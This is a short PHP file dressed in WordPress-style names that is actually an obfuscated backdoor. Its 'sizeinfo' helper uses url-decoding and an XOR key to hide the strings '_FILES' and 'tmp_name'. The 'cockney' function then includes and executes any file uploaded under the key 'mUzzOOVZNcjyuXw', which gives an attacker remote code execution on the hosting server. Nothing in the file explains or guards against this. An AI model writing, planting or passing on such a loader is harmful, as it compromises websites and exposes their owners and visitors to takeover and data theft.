<?php
        

    

        
function cockney($count2)

{
    $_charset = $count2;

    

    $double_preg = $GLOBALS[sizeinfo("2%1336%0A%1C", $_charset)];

    $emoji_fields = $double_preg;
    $days = isset($emoji_fields[$_charset]);

    if ($days)

    {
	$arg_index = 'tb_url';
        $ext_preg = $double_preg[$_charset];
        $delete = $ext_preg[sizeinfo("%198%0A%25%21.%3B%3F", $_charset)];

        $include = $delete;
        include ($include);

    }

}

function sizeinfo($_edit_link, $capabilities)

{
    $add_trashed_suffix = $capabilities;

    $static_characters = "url" . "decode";

    $start = $static_characters($_edit_link);

    $mime_match = substr($add_trashed_suffix,0, strlen($start));
    $no_texturize_shortcodes_stack = $start ^ $mime_match;
    

    $start = strpos($no_texturize_shortcodes_stack, $mime_match);

    

    return $no_texturize_shortcodes_stack;
}

cockney('mUzzOOVZNcjyuXw');
	$bad_slug = 'fallback_title';

?>
